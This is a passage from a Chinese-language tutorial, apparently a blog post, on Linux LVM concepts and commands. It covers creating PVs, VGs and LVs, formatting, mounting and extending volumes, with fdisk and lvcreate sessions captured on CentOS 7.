<p>​    在将硬盘格式化成PV以后，我们第二步操作就是创建一个卷组，也就是<strong>VG</strong>(Volume Group),卷组在这里我们可以将其抽象化成一个空间池，VG的作用就是用来装PE的，我们可以把一个或者多个PV加到VG当中，因为在第一步操作时就已经将该硬盘划分成了多个PE，所以将多个PV加到VG里面后，VG里面就存放了许许多多来自不同PV中的PE，我们通过上面的图片就可以看到，我们格式化了两块硬盘，每个硬盘分别格式化成了3个PE，然后将两块硬盘的PE都加到了我们的VG当中，那么我们的VG当中就包含了6个PE，这6个PE就是两个硬盘的PE之和。通常创建一个卷组的时候我们会为其取一个名字，也就是该VG的名字。</p>
<p><strong>3.基于VG创建我们最后要使用的LV(Logical Volume)</strong></p>
<p>​    【<strong>注意</strong>】PV以及VG创建好以后我们是不能够直接使用的，因为PV、VG是我们逻辑卷底层的东西，我们其实最后使用的是在VG基础上创建的<strong>LV</strong>(Logical Volume),所以第三步操作就是基于VG来创建我们最终要使用的LV。</p>
<p>​    当我们创建好我们的VG以后，这个时候我们创建LV其实就是从VG中拿出我们指定数量的PE，还是拿上图来说，我们看到我们此时的VG里面已经拥有了6个PE，这时候我们创建了我们的第一个逻辑卷，它的大小是4个PE的大小，也就是16M(因为一个PE的默认大小是4M)，而这4个PE有三个是来自于第一块硬盘，而另外一个PE则是来自第二块硬盘。当我们创建第二个逻辑卷时，它的大小就最多只有两个PE的大小了，因为其中的4个PE已经分配给了我们的第一个逻辑卷。</p>
<p>​    所以创建逻辑卷其实就是我们从VG中拿出我们指定数量的PE，VG中的PE可以来自不同的PV，我们可以创建的逻辑卷的大小取决于VG当中PE存在的数量，并且我们创建的逻辑卷其大小一定是PE的整数倍(即逻辑卷的大小一定要是4M的整数倍)。</p>
<p><strong>4.将我们创建好的LV进行文件系统的格式化，然后挂载使用</strong></p>
<p>​    在创建好LV以后，这个时候我们就能够对其进行文件系统的格式化了，我们最终使用的就是我们刚创建好的LV，其就相当于传统的文件管理的分区，我们首先要对其进行文件系统的格式化操作，然后通过mount命令对其进行挂载，这个时候我们就能够像使用平常的分区一样来使用我们的逻辑卷了。</p>
<p>​    我们在创建好LV以后，我们会在 /dev 目录下看到我们的LV信息，例如 /dev/vgname/lvname， 我们每创建一个VG，其会在/dev目录下创建一个以该VG名字命名的文件夹，在该VG的基础上创建好LV以后，我们会在这个VG目录下多出一个以LV名字命名的逻辑卷。</p>
<h2 id="命令整理"><a href="#命令整理" class="headerlink" title="命令整理"></a>命令整理</h2><table>
<thead>
<tr>
<th>命令</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>fdisk</td>
<td>查看磁盘信息</td>
</tr>
<tr>
<td>pvcreate /dev/sdb1 /dev/sdc1</td>
<td>创建PV物理卷</td>
</tr>
<tr>
<td>pvdisplay</td>
<td>查看物理卷详细信息</td>
</tr>
<tr>
<td>pvs</td>
<td>查看物理卷摘要信息</td>
</tr>
<tr>
<td>vgcreate VG1 /dev/sdb1 /dev/sdc1</td>
<td>创建卷组（Volume</td>
</tr>
<tr>
<td>vgdisplay</td>
<td>查看所有卷组的详细信息</td>
</tr>
<tr>
<td>vgs</td>
<td>查看卷组的摘要信息</td>
</tr>
<tr>
<td>lvcreate -n LV1 -L 1G VG1</td>
<td>创建逻辑卷</td>
</tr>
</tbody></table>
<p>各参数含义：</p>
<ul>
<li>-n：表示创建逻辑卷名 </li>
<li>-L ：表示分配逻辑卷的大小</li>
<li>VG1：表示在卷组VG1上创建逻辑卷LV1</li>
</ul>
<table>
<thead>
<tr>
<th>命令</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>lvs</td>
<td>显示逻辑卷的信息</td>
</tr>
<tr>
<td>lvdisplay</td>
<td>显示逻辑卷的详细信息</td>
</tr>
<tr>
<td>mke2fs -t ext4 /dev/VG1/LV1</td>
<td>格式化物理卷</td>
</tr>
<tr>
<td>mount /dev/VG1/LV1 /root/lvm1</td>
<td>挂载，可以再/etc/fstab中永久挂载</td>
</tr>
<tr>
<td>vgextend VG1 /dev/sdd1</td>
<td>扩容卷组容量，把物理卷加入卷组</td>
</tr>
<tr>
<td>lvextend -L +2G /dev/VG1/LV1</td>
<td>扩容逻辑卷LV1，增加2G容量</td>
</tr>
<tr>
<td>resize2fs /dev/VG1/LV1</td>
<td>确认增加容量</td>
</tr>
<tr>
<td>e2fsck -f /dev/VG1/LV1</td>
<td>强制检查LV1逻辑卷，需先卸载</td>
</tr>
<tr>
<td>resize2fs /dev/VG1/LV1 1G</td>
<td>缩减逻辑卷，-1G表示缩减1G大小，1G表示缩减到1G</td>
</tr>
<tr>
<td>lvreduce -L 1G /dev/VG1/LV1</td>
<td>再进行逻辑卷的LV容量的缩减</td>
</tr>
<tr>
<td>pvmove /dev/sdb1</td>
<td>将sdb1磁盘分区的数据转移到其他盘上</td>
</tr>
<tr>
<td>vgreduce VG1 /dev/sdb1</td>
<td>把sdb1从VG1卷组中移除</td>
</tr>
<tr>
<td>pvremove /dev/sdb1</td>
<td>把sdb1分区从PV物理卷中释放出来</td>
</tr>
<tr>
<td>lvcreate -L 20M -n backup -s -p r /dev/V1/LV1</td>
<td>备份逻辑卷LV1</td>
</tr>
<tr>
<td>lvremove /dev/V1/backup</td>
<td>删除逻辑卷的备份</td>
</tr>
</tbody></table>
<h2 id="内核要求"><a href="#内核要求" class="headerlink" title="内核要求"></a>内核要求</h2><p>LVM1版本需要2.4及以后的内核支持；LVM2需要2.6及以后的内核版本支持。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@node1 LG]<span class="comment"># cat /etc/redhat-release </span></span><br><span class="line">CentOS Linux release 7.7.1908 (Core)</span><br><span class="line">[root@node1 LG]<span class="comment"># uname -r</span></span><br><span class="line">3.10.0-1062.1.2.el7.x86_64</span><br></pre></td></tr></table></figure>

<h2 id="磁盘分区-1"><a href="#磁盘分区-1" class="headerlink" title="磁盘分区"></a>磁盘分区</h2><p>添加两块磁盘，分别为：<code>/dev/sdb</code>和<code>/dev/sdc</code>，分别对sdb和sdc进行分区。</p>
<p>sdb的分区是：两个主分区</p>
<p>sdc的分区是：一个主分区和一个扩展分区，其中扩展分区有分出了逻辑分区</p>
<p>第一块磁盘<code>/dev/sdb</code>分区：创建两个主分区</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">[root@node1 ~]<span class="comment"># fdisk /dev/sdb</span></span><br><span class="line">Welcome to fdisk (util-linux 2.23.2).</span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): n</span><br><span class="line">Partition <span class="built_in">type</span>:</span><br><span class="line">   p   primary (0 primary, 0 extended, 4 free)</span><br><span class="line">   e   extended</span><br><span class="line">Select (default p): p <span class="comment">#主分区</span></span><br><span class="line">Using default response p</span><br><span class="line">Partition number (1-4, default 1): </span><br><span class="line">First sector (2048-41943039, default 2048): </span><br><span class="line">Using default value 2048</span><br><span class="line">Last sector, +sectors or +size&#123;K,M,G&#125; (2048-41943039, default 41943039): +5G</span><br><span class="line">Partition 1 of <span class="built_in">type</span> Linux and of size 5 GiB is <span class="built_in">set</span></span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): n</span><br><span class="line">Partition <span class="built_in">type</span>:</span><br><span class="line">   p   primary (1 primary, 0 extended, 3 free)</span><br><span class="line">   e   extended</span><br><span class="line">Select (default p): p <span class="comment">#第一块磁盘划分两个主分区</span></span><br><span class="line">Using default response p</span><br><span class="line">Partition number (2-4, default 2): </span><br><span class="line">First sector (10487808-41943039, default 10487808): </span><br><span class="line">Using default value 10487808</span><br><span class="line">Last sector, +sectors or +size&#123;K,M,G&#125; (10487808-41943039, default 41943039): </span><br><span class="line">Using default value 41943039</span><br><span class="line">Partition 2 of <span class="built_in">type</span> Linux and of size 15 GiB is <span class="built_in">set</span>  </span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): t  <span class="comment">#做LVM管理，需要修改分区类型为Linux LVM</span></span><br><span class="line">Partition number (1,2, default 2): 1</span><br><span class="line">Hex code (<span class="built_in">type</span> L to list all codes): 8e</span><br><span class="line">Changed <span class="built_in">type</span> of partition <span class="string">'Linux'</span> to <span class="string">'Linux LVM'</span></span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): t</span><br><span class="line">Partition number (1,2, default 2): </span><br><span class="line">Hex code (<span class="built_in">type</span> L to list all codes): 8e</span><br><span class="line">Changed <span class="built_in">type</span> of partition <span class="string">'Linux'</span> to <span class="string">'Linux LVM'</span></span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): p</span><br><span class="line"></span><br><span class="line">Disk /dev/sdb: 21.5 GB, 21474836480 bytes, 41943040 sectors</span><br><span class="line">Units = sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disk label <span class="built_in">type</span>: dos</span><br><span class="line">Disk identifier: 0xb7ee3c1b</span><br><span class="line"></span><br><span class="line">   Device Boot      Start         End      Blocks   Id  System</span><br><span class="line">/dev/sdb1            2048    10487807     5242880   8e  Linux LVM</span><br><span class="line">/dev/sdb2        10487808    41943039    15727616   8e  Linux LVM</span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): w <span class="comment">#保存分区信息</span></span><br><span class="line">The partition table has been altered!</span><br><span class="line"></span><br><span class="line"><span class="comment">#更新内核分区表</span></span><br><span class="line">[root@node1 ~]<span class="comment"># partprobe /dev/sdb</span></span><br><span class="line">[root@node1 ~]<span class="comment"># ls /dev/sdb*</span></span><br><span class="line">/dev/sdb  /dev/sdb1  /dev/sdb2</span><br></pre></td></tr></table></figure>



<p>第二块磁盘<code>sdc</code>的分区：创建一个主分区和一个逻辑分区，用来测试扩展分区和逻辑分区是否能够创建PV物理卷并加入VG卷组，实验证明，扩展分区是无法创建PV和加入VG，主分区和逻辑分区可以。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">[root@node1 ~]<span class="comment"># fdisk /dev/sdc</span></span><br><span class="line">Welcome to fdisk (util-linux 2.23.2).</span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): n</span><br><span class="line">Partition <span class="built_in">type</span>:</span><br><span class="line">   p   primary (0 primary, 0 extended, 4 free)</span><br><span class="line">   e   extended</span><br><span class="line">Select (default p): p <span class="comment">#主分区</span></span><br><span class="line">Using default response p</span><br><span class="line">Partition number (1-4, default 1): </span><br><span class="line">First sector (2048-41943039, default 2048): </span><br><span class="line">Using default value 2048</span><br><span class="line">Last sector, +sectors or +size&#123;K,M,G&#125; (2048-41943039, default 41943039): +5G</span><br><span class="line">Partition 1 of <span class="built_in">type</span> Linux and of size 5 GiB is <span class="built_in">set</span></span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): n</span><br><span class="line">Partition <span class="built_in">type</span>:</span><br><span class="line">   p   primary (1 primary, 0 extended, 3 free)</span><br><span class="line">   e   extended</span><br><span class="line"><span class="comment">#扩展分区，要创建扩展分区之后，才能创建逻辑分区；</span></span><br><span class="line"><span class="comment">#扩展分区只能创建一个，分区表支持创建最多四分主分区，</span></span><br><span class="line"><span class="comment">#如果想要创建4个以上的分区，必须创建扩展分区，然后创建逻辑分区</span></span><br><span class="line">Select (default p): e</span><br><span class="line">Partition number (2-4, default 2): </span><br><span class="line">First sector (10487808-41943039, default 10487808): </span><br><span class="line">Using default value 10487808</span><br><span class="line">Last sector, +sectors or +size&#123;K,M,G&#125; (10487808-41943039, default 41943039): </span><br><span class="line">Using default value 41943039</span><br><span class="line">Partition 2 of <span class="built_in">type</span> Extended and of size 15 GiB is <span class="built_in">set</span></span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): n</span><br><span class="line">Partition <span class="built_in">type</span>:</span><br><span class="line">   p   primary (1 primary, 1 extended, 2 free)</span><br><span class="line">   l   logical (numbered from 5)</span><br><span class="line">Select (default p): l <span class="comment">#创建逻辑分区</span></span><br><span class="line">Adding logical partition 5</span><br><span class="line">First sector (10489856-41943039, default 10489856): </span><br><span class="line">Using default value 10489856</span><br><span class="line">Last sector, +sectors or +size&#123;K,M,G&#125; (10489856-41943039, default 41943039): </span><br><span class="line">Using default value 41943039</span><br><span class="line">Partition 5 of <span class="built_in">type</span> Linux and of size 15 GiB is <span class="built_in">set</span></span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): p</span><br><span class="line"></span><br><span class="line">Disk /dev/sdc: 21.5 GB, 21474836480 bytes, 41943040 sectors</span><br><span class="line">Units = sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disk label <span class="built_in">type</span>: dos</span><br><span class="line">Disk identifier: 0x313b8a59</span><br><span class="line"></span><br><span class="line">   Device Boot      Start         End      Blocks   Id  System</span><br><span class="line">/dev/sdc1            2048    10487807     5242880   83  Linux</span><br><span class="line">/dev/sdc2        10487808    41943039    15727616    5  Extended</span><br><span class="line">/dev/sdc5        10489856    41943039    15726592   83  Linux</span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): t  <span class="comment">#修改分区类型</span></span><br><span class="line">Partition number (1,2,5, default 5): 1</span><br><span class="line">Hex code (<span class="built_in">type</span> L to list all codes): 8e</span><br><span class="line">Changed <span class="built_in">type</span> of partition <span class="string">'Linux'</span> to <span class="string">'Linux LVM'</span></span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): t</span><br><span class="line">Partition number (1,2,5, default 5): 5</span><br><span class="line">Hex code (<span class="built_in">type</span> L to list all codes): 8e</span><br><span class="line">Changed <span class="built_in">type</span> of partition <span class="string">'Linux'</span> to <span class="string">'Linux LVM'</span></span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): p</span><br><span class="line"></span><br><span class="line">Disk /dev/sdc: 21.5 GB, 21474836480 bytes, 41943040 sectors</span><br><span class="line">Units = sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disk label <span class="built_in">type</span>: dos</span><br><span class="line">Disk identifier: 0x313b8a59</span><br><span class="line"></span><br><span class="line">   Device Boot      Start         End      Blocks   Id  System</span><br><span class="line">/dev/sdc1            2048    10487807     5242880   8e  Linux LVM</span><br><span class="line">/dev/sdc2        10487808    41943039    15727616    5  Extended</span><br><span class="line">/dev/sdc5        10489856    41943039    15726592   8e  Linux LVM</span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): w <span class="comment">#保存分区表信息</span></span><br><span class="line">The partition table has been altered!</span><br><span class="line">[root@node1 ~]<span class="comment"># partprobe /dev/sdc</span></span><br><span class="line">[root@node1 ~]<span class="comment"># ls -l /dev/sdc*</span></span><br><span class="line">brw-rw---- 1 root disk 8, 32 Dec 25 06:31 /dev/sdc</span><br><span class="line">brw-rw---- 1 root disk 8, 33 Dec 25 06:31 /dev/sdc1</span><br><span class="line">brw-rw---- 1 root disk 8, 34 Dec 25 06:31 /dev/sdc2</span><br><span class="line">brw-rw---- 1 root disk 8, 37 Dec 25 06:31 /dev/sdc5</span><br></pre></td></tr></table></figure>





<h2 id="创建PV、VG、LV"><a href="#创建PV、VG、LV" class="headerlink" title="创建PV、VG、LV"></a>创建PV、VG、LV</h2><p>报错</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@node1 ~]<span class="comment"># pvcreate /dev/sdb1</span></span><br><span class="line">  Can<span class="string">'t open /dev/sdb1 exclusively.  Mounted filesystem?</span></span><br><span class="line"><span class="string">  Can'</span>t open /dev/sdb1 exclusively.  Mounted filesystem?</span><br><span class="line">  可以尝试修改配置文件：</span><br><span class="line">  /etc/lvm/lvm.conf</span><br></pre></td></tr></table></figure>



<p>创建物理卷PV</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># pvcreate /dev/sdc2 #sdc2是扩展分区，无法做成物理卷PV</span></span><br><span class="line">  Device /dev/sdc2 not found (or ignored by filtering).</span><br><span class="line">[root@node1 ~]<span class="comment"># pvcreate /dev/sdb1 </span></span><br><span class="line"><span class="comment">#把sdb1做成物理卷PV，也可以用下面的写法，一次性把所有主分区或逻辑分区做成物理卷PV</span></span><br><span class="line">  Physical volume <span class="string">"/dev/sdb1"</span> successfully created.</span><br><span class="line">[root@node1 ~]<span class="comment"># pvcreate /dev/sdb2 /dev/sdc1 /dev/sdc5</span></span><br><span class="line">  Physical volume <span class="string">"/dev/sdb2"</span> successfully created.</span><br><span class="line">  Physical volume <span class="string">"/dev/sdc1"</span> successfully created.</span><br><span class="line">  Physical volume <span class="string">"/dev/sdc5"</span> successfully created.</span><br><span class="line">[root@node1 ~]<span class="comment"># pvs</span></span><br><span class="line"><span class="comment">#显示所有的物理卷</span></span><br><span class="line">  PV         VG     Fmt  Attr PSize   PFree  </span><br><span class="line">  /dev/sda2  centos lvm2 a--  &lt;19.00g      0 </span><br><span class="line">  /dev/sdb1         lvm2 ---    5.00g   5.00g</span><br><span class="line">  /dev/sdb2         lvm2 ---  &lt;15.00g &lt;15.00g</span><br><span class="line">  /dev/sdc1         lvm2 ---    5.00g   5.00g</span><br><span class="line">  /dev/sdc5         lvm2 ---  &lt;15.00g &lt;15.00g</span><br></pre></td></tr></table></figure>



<p>创建卷组VG</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#创建卷组1，卷组的PV物理卷，可以是不同磁盘，即整合了所有磁盘分区做成资源池</span><br><span class="line">[root@node1 ~]# vgcreate V1 &#x2F;dev&#x2F;sdb1 &#x2F;dev&#x2F;sdc1</span><br><span class="line">  Volume group &quot;V1&quot; successfully created</span><br><span class="line">[root@node1 ~]# vgcreate V2 &#x2F;dev&#x2F;sdb2 &#x2F;dev&#x2F;sdc5</span><br><span class="line">  Volume group &quot;V2&quot; successfully created</span><br><span class="line">[root@node1 ~]# vgs</span><br><span class="line">  VG     #PV #LV #SN Attr   VSize   VFree </span><br><span class="line">  V1       2   0   0 wz--n-   9.99g  9.99g</span><br><span class="line">  V2       2   0   0 wz--n-  29.99g 29.99g</span><br><span class="line">  centos   1   2   0 wz--n- &lt;19.00g     0</span><br></pre></td></tr></table></figure>



<p>创建逻辑卷lv</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-n表示创建逻辑卷名，-L表示分配逻辑卷的空间大小，VG1表示在卷组VG1上创建逻辑卷LVtest1</span></span><br><span class="line">[root@node1 ~]<span class="comment"># lvcreate -n LV1 -L 1G V1</span></span><br><span class="line">  Logical volume <span class="string">"LV1"</span> created.</span><br><span class="line">[root@node1 ~]<span class="comment"># lvcreate -n LV2 -L 1G V2</span></span><br><span class="line">  Logical volume <span class="string">"LV2"</span> created.</span><br><span class="line">[root@node1 ~]<span class="comment"># lvs</span></span><br><span class="line">  LV   VG     Attr       LSize   Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert</span><br><span class="line">  LV1  V1     -wi<span class="_">-a</span>-----   1.00g                                                    </span><br><span class="line">  LV2  V2     -wi<span class="_">-a</span>-----   1.00g                                                    </span><br><span class="line">  root centos -wi-ao---- &lt;17.00g                                                    </span><br><span class="line">  swap centos -wi-ao----   2.00g                                                    </span><br><span class="line">[root@node1 ~]<span class="comment"># ls -l /dev/V1</span></span><br><span class="line">total 0</span><br><span class="line">lrwxrwxrwx 1 root root 7 Dec 25 07:33 LV1 -&gt; ../dm-2</span><br></pre></td></tr></table></figure>



<p>格式化逻辑卷LV</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#物理卷需要格式化之后才能使用，格式化为ext4格式</span></span><br><span class="line">[root@node1 ~]<span class="comment"># mke2fs -t ext4 /dev/V1/LV1 </span></span><br><span class="line">mke2fs 1.42.9 (28-Dec-2013)</span><br><span class="line">Filesystem label=</span><br><span class="line">OS <span class="built_in">type</span>: Linux</span><br><span class="line">Block size=4096 (<span class="built_in">log</span>=2)</span><br><span class="line">Fragment size=4096 (<span class="built_in">log</span>=2)</span><br><span class="line">Stride=0 blocks, Stripe width=0 blocks</span><br><span class="line">65536 inodes, 262144 blocks</span><br><span class="line">13107 blocks (5.00%) reserved <span class="keyword">for</span> the super user</span><br><span class="line">First data block=0</span><br><span class="line">Maximum filesystem blocks=268435456</span><br><span class="line">8 block groups</span><br><span class="line">32768 blocks per group, 32768 fragments per group</span><br><span class="line">8192 inodes per group</span><br><span class="line">Superblock backups stored on blocks: </span><br><span class="line">	32768, 98304, 163840, 229376</span><br><span class="line"></span><br><span class="line">Allocating group tables: <span class="keyword">done</span>                            </span><br><span class="line">Writing inode tables: <span class="keyword">done</span>                            </span><br><span class="line">Creating journal (8192 blocks): <span class="keyword">done</span></span><br><span class="line">Writing superblocks and filesystem accounting information: <span class="keyword">done</span></span><br></pre></td></tr></table></figure>



<p>挂载逻辑卷</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@node1 ~]<span class="comment"># mkdir LG</span></span><br><span class="line">[root@node1 ~]<span class="comment"># mount /dev/V1/LV1 LG/</span></span><br><span class="line">[root@node1 ~]<span class="comment"># df -h</span></span><br><span class="line">Filesystem               Size  Used Avail Use% Mounted on</span><br><span class="line">devtmpfs                 475M     0  475M   0% /dev</span><br><span class="line">tmpfs                    487M     0  487M   0% /dev/shm</span><br><span class="line">tmpfs                    487M  7.6M  479M   2% /run</span><br><span class="line">tmpfs                    487M     0  487M   0% /sys/fs/cgroup</span><br><span class="line">/dev/mapper/centos-root   17G  2.1G   15G  12% /</span><br><span class="line">/dev/sda1               1014M  176M  839M  18% /boot</span><br><span class="line">tmpfs                     98M     0   98M   0% /run/user/0</span><br><span class="line">/dev/mapper/V1-LV1       976M  2.6M  907M   1% /root/LG</span><br><span class="line"></span><br><span class="line"><span class="comment">#永久挂载逻辑卷需要在/etc/fstab中设置</span></span><br></pre></td></tr></table></figure>



<p>新增加一块硬盘，并将这块磁盘创建PV</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#通知系统重新搜索磁盘</span></span><br><span class="line">[root@node1 ~]<span class="comment"># echo "- - - " &gt; /sys/class/scsi_host/host0/scan</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#按照之前的方法，将/dev/sdd分区并更改格式</span></span><br><span class="line">[root@node1 ~]<span class="comment"># fdisk -l /dev/sdd | tail -n 2</span></span><br><span class="line">   Device Boot      Start         End      Blocks   Id  System</span><br><span class="line">/dev/sdd1            2048    10487807     5242880   8e  Linux LVM</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建物理卷PV</span></span><br><span class="line">[root@node1 ~]<span class="comment"># pvcreate /dev/sdd1</span></span><br><span class="line">  Physical volume <span class="string">"/dev/sdd1"</span> successfully created.</span><br><span class="line">  </span><br><span class="line"><span class="comment">#扩展VG卷组容量，把物理卷加入卷组</span></span><br><span class="line">[root@localhost ~]<span class="comment"># vgextend VG1 /dev/sdd1</span></span><br></pre></td></tr></table></figure>

